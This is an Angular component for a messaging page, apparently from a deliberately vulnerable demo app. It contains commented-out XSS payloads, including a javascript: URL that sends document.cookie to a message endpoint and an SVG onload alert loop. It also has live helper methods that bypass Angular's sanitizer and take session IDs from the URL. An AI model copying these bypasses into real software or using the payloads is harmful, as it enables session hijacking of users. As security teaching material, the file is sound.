import { Component, OnInit } from '@angular/core';
import { Observable } from 'rxjs';
import { User } from '../../_models/user';
import { AuthService } from '../../_services/auth.service';
import { Message } from '@angular/compiler/src/i18n/i18n_ast';
import { Router } from '@angular/router';
import { MessageService } from '../../_services/message.service';
import { DomSanitizer, SafeResourceUrl, SafeUrl, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-messages',
  templateUrl: './messages.component.html',
  styleUrls: ['./messages.component.css']
})
export class MessagesComponent implements OnInit {

  messages$: Observable<Message[]>;
  loggedUser$: Observable<User>;
  content:string;
  message1:SafeUrl;
  message2:SafeHtml;
  message3:SafeHtml;
  contents:SafeHtml[]=[];
  session:string;

  constructor(private messageService: MessageService, private router: Router, private authService: AuthService,
     private sanitizer:DomSanitizer) {
       //this.message1=this.sanitizer.bypassSecurityTrustUrl('javascript:document.location="https://localhost:4200/api/addmessage/receiver=zupan@gmail.com&content="+document.cookie;document.body.innerHTML = "";');
       //this.message2=this.sanitizer.bypassSecurityTrustUrl('javascript:document.cookie="SESSIONID=";document.body.innerHTML = "";');
       //this.message3=this.sanitizer.bypassSecurityTrustHtml('<svg onload="var i;for (i=0;i<50;++i){alert(404)}"></svg>');
       this.session = this.router.url.split("SESSIONID/")[1].toString();
      if (!this.session) {
        this.session = document.cookie.split("=")[1].substring(0, document.cookie.split("=")[1].length);
      }  
    
      this.messages$=this.messageService.getMessages(this.session);
      this.loggedUser$=this.authService.user$;
  }

  desanitizeURL(text:string):SafeUrl {
    return this.sanitizer.bypassSecurityTrustUrl(text);
  }

  get() {
    return this.sanitizer.bypassSecurityTrustHtml('<svg onload="alert(1)"></svg>');
  }


  ngOnInit(): void {
    this.session = this.router.url.split("SESSIONID/")[1].toString();
    if (!this.session) {
       this.session = document.cookie.split("=")[1].substring(0, document.cookie.split("=")[1].length);
    }  

    this.messages$=this.messageService.getMessages(this.session);
    this.loggedUser$=this.authService.user$;
    
  }

  openModal(num:number){
    // Get the modal
    var modal = document.getElementById("myModal"+num);

    // When the user clicks the button, open the modal 

    modal.style.display = "block";
  }

  closeModal(num:number){
    // Get the <span> element that closes the modal

    // When the user clicks on <span> (x), close the modal
    var modal = document.getElementById("myModal"+num);

      modal.style.display = "none";
    

  // When the user clicks anywhere outside of the modal, close it
  window.onclick = function(event) {
    if (event.target == modal) {
      modal.style.display = "none";
    }
  }


  }

}